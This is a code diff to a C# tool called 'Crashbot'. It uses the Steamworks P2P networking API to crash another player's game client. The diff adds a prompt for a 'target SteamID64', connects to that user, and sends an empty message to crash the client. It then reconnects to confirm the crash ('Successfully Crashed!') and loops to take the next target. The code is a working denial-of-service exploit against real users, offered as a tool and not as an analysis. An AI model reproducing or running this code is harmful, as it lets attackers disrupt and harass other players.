@@ -16,20 +16,6 @@ namespace Crashbot
             Console.WriteLine(Environment.CurrentDirectory);
             File.WriteAllText("steam_appid.txt", "387990");
 
-            System.Timers.Timer mainloop = new()
-            {
-                Interval = 100,
-                AutoReset = true,
-                Enabled = true
-            };
-
-            mainloop.Elapsed += (s, e) =>
-            {
-                //SteamAPI.RunCallbacks();
-            };
-
-            //mainloop.Start();
-
 
             if (!Steamworks.SteamAPI.Init())
             {
@@ -40,55 +26,16 @@ namespace Crashbot
             {
                 Console.WriteLine("BLoggedOn: " + Steamworks.SteamUser.BLoggedOn());
                 Console.WriteLine("SteamID: " + Steamworks.SteamUser.GetSteamID());
-
             }
 
-            var steamuser = new SteamKit2.SteamID(76561198299556567);
+            start:
+
+            Console.Write("Enter target SteamID64: ");
+            ulong target = ulong.Parse(Console.ReadLine()?.Trim() ?? "0");
+
+            var steamuser = new SteamKit2.SteamID(target);
             CSteamID cSteamID = new(steamuser.ConvertToUInt64());
-            Console.WriteLine($"Logged in + [{cSteamID.m_SteamID}]");
-            /*
-            System.Timers.Timer t = new()
-            {
-                Enabled = true,
-                AutoReset = true,
-                Interval = 50
-            };
-
-            t.Elapsed += (s, e) =>
-            {
-                Steamworks.SteamNetworkingSockets.RunCallbacks();
-
-                while (SteamNetworking.IsP2PPacketAvailable(out uint size))
-                {
-                    // allocate buffer and needed variables
-                    var buffer = new byte[size];
-
-                    // read the message into the buffer
-                    if (SteamNetworking.ReadP2PPacket(buffer, size, out uint bytesRead, out CSteamID remoteId))
-                    {
-                        string message = System.Text.Encoding.UTF8.GetString(buffer, 0, (int)bytesRead);
-                        Console.WriteLine("Received a message: " + message);
-                    }
-                }
-                    
-                Steamworks.SteamNetworking.GetP2PSessionState(cSteamID, out Steamworks.P2PSessionState_t state);
-                if (state.m_bConnectionActive == 1)
-                {
-                    Console.WriteLine("Connection is active");
-                    Console.WriteLine(JsonConvert.SerializeObject(state, Formatting.Indented));
-                }
-                else if (state.m_eP2PSessionError != 0)
-                {
-                    Console.WriteLine("Connection error: " + state.m_eP2PSessionError);
-                    Console.WriteLine(JsonConvert.SerializeObject(state, Formatting.Indented));
-
-                    t.Stop();
-                    //Steamworks.SteamNetworking.CloseP2PChannelWithUser(cSteamID, 0);
-                    //Steamworks.SteamNetworking.CloseP2PSessionWithUser(cSteamID);
-                }
-            };
-
-            t.Start();*/
+            Console.WriteLine($"Targeting [{cSteamID.m_SteamID}]");
 
             SteamNetworkingIdentity remoteIdentity = new();
             remoteIdentity.SetSteamID(cSteamID);
@@ -98,7 +45,6 @@ namespace Crashbot
             var res = Steamworks.SteamNetworkingSockets.InitAuthentication();
             Steamworks.SteamNetworkingSockets.RunCallbacks();
             Steamworks.SteamAPI.RunCallbacks();
-            // Console.WriteLine(res);
 
             Steamworks.SteamNetworkingSockets.GetAuthenticationStatus(out Steamworks.SteamNetAuthenticationStatus_t status);
             while (status.m_eAvail != ESteamNetworkingAvailability.k_ESteamNetworkingAvailability_Current)
@@ -110,7 +56,6 @@ namespace Crashbot
                 Thread.Sleep(100);
             }
 
-            // Console.WriteLine(JsonConvert.SerializeObject(status, Formatting.Indented));
             Console.WriteLine("m_eAvail: " + status.m_eAvail);
 
             bool state = false;
@@ -120,7 +65,7 @@ namespace Crashbot
             Steamworks.SteamNetworkingSockets.RunCallbacks();
 
             conn = Steamworks.SteamNetworkingSockets.ConnectP2P(ref remoteIdentity, 0, 0, []);
-            Steamworks.SteamNetworkingSockets.FlushMessagesOnConnection(conn.Value);
+            // Steamworks.SteamNetworkingSockets.FlushMessagesOnConnection(conn.Value);
             Console.WriteLine("Init connection...");
 
             Steamworks.SteamAPI.RunCallbacks();
@@ -137,11 +82,8 @@ namespace Crashbot
                 Thread.Sleep(100);
             }
 
-            // Console.WriteLine(JsonConvert.SerializeObject(info, Formatting.Indented));
-            Console.WriteLine("m_eState: " + info.m_eState);
             Console.WriteLine("Connected!");
 
-            //Console.ReadLine();
             int maxMessages = 1;
             while (true)
             {
@@ -150,21 +92,9 @@ namespace Crashbot
 
                 if (messageCount > 0)
                 {
-                    /*
-                    for (int i = 0; i < messageCount; i++)
-                    {
-                        // Marshaling the message pointer to a SteamNetworkingMessage_t structure
-                        SteamNetworkingMessage_t netMessage = Marshal.PtrToStructure<SteamNetworkingMessage_t>(messagePointers[i]);
-
-                        // Process the message
-                        ProcessMessage(netMessage);
-
-                        // Don't forget to release the message
-                        netMessage.Release();
-                    }
-                    */
                     Steamworks.SteamNetworkingSockets.SendMessageToConnection(conn.Value, 0, 0, 0, out long messageID);
                     Console.WriteLine("Crashing client...");
+                    break;
                 }
                 else
                 {
@@ -172,7 +102,41 @@ namespace Crashbot
                     Thread.Sleep(10); // Sleep for 10 milliseconds
                 }
             }
-            //Steamworks.SteamNetworkingSockets.CloseConnection(conn.Value, 0, "\0", false);
+
+            Thread.Sleep(100);
+
+            // confirm crashed
+            const int desiredTimeoutValue = 300;
+            // Create an array of connection parameters (config values)
+            SteamNetworkingConfigValue_t[] connectionParams = new SteamNetworkingConfigValue_t[1];
+
+            // Set the timeout option
+            connectionParams[0].m_eValue = ESteamNetworkingConfigValue.k_ESteamNetworkingConfig_TimeoutInitial;
+            connectionParams[0].m_val = new SteamNetworkingConfigValue_t.OptionValue { m_int32 = desiredTimeoutValue };
+
+            // The desiredTimeoutValue is in milliseconds. Set this to the timeout you want.
+
+            // Start the connection attempt
+            conn = Steamworks.SteamNetworkingSockets.ConnectP2P(ref remoteIdentity, 0, 0, connectionParams);
+
+            Steamworks.SteamAPI.RunCallbacks();
+            Steamworks.SteamNetworkingSockets.RunCallbacks();
+            Thread.Sleep(25);
+
+            Steamworks.SteamNetworkingSockets.GetConnectionInfo(conn.Value, out info);
+            while (info.m_eState == ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_Connecting)
+            {
+                Steamworks.SteamAPI.RunCallbacks();
+                Steamworks.SteamNetworkingSockets.RunCallbacks();
+
+                Steamworks.SteamNetworkingSockets.GetConnectionInfo(conn.Value, out info);
+            }
+
+            Console.WriteLine(info.m_eState == ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_Connected ? "Failed to Crash" : "Successfully Crashed!");
+
+            Steamworks.SteamNetworkingSockets.CloseConnection(conn.Value, 0, "\0", false);
+
+            goto start;
         }
     }
 }
